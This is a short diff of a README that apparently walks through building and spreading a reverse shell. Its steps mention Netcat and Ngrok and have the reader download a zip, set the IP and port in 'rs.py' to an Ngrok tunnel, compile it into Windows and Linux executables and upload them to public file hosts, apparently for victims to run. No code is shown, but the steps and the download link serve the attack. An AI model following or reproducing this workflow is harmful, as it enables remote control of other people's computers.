@@ -18,7 +18,7 @@ you will need [Python](https://www.python.org/downloads/), [Netcat](https://eter
 
 
 5. **Download and Edit Python File**
-   - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and edit the IP and port to be the Ngrok one.
+   - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and in rs.py edit the IP and port to be the Ngrok one.
    - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
    - Upload the compiled files to [catbox.moe](https://catbox.moe) or [CatLitter](https://catlitter.minoa.cat)
 
